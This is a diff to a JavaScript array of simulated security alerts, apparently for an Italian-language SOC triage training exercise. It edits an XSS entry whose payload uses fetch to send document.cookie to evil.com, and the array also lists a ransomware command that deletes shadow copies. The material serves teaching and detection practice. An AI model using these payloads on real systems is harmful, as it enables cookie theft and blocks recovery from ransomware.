@@ -225,7 +225,7 @@
             { cat: "EDR: RANSOMWARE BEHAVIOR", detail: "vssadmin.exe delete shadows /all /quiet", ctx: "Processo su Server DB", malicious: true },
             { cat: "PROXY: C2 BEACONING", detail: "Connessione TCP a 198.51.100.3:4444", ctx: "IP Non categorizzato (Threat Intel: High)", malicious: true },
             { cat: "NETWORK: LATERAL MOVEMENT", detail: "SMB Auth Success (Admin)", ctx: "Source: PC-Stagista -> Dest: DomainController", malicious: true },
-            { cat: "WAF: XSS EXPLOIT", detail: "User-Agent: <script>fetch('http://evil.com/'+document.cookie)</script>", ctx: "Traffico in ingresso", malicious: true },
+            { cat: "WAF: XSS EXPLOIT", detail: "User-Agent: fetch('http://evil.com/'+document.cookie)", ctx: "Traffico in ingresso", malicious: true },
             { cat: "IDENTITY: BRUTE FORCE", detail: "50 Login Falliti in 1 min, seguito da 1 Successo", ctx: "Utente: ceo_account", malicious: true },
             
             // --- FALSE POSITIVES (Da Ignorare - Tranelli) ---
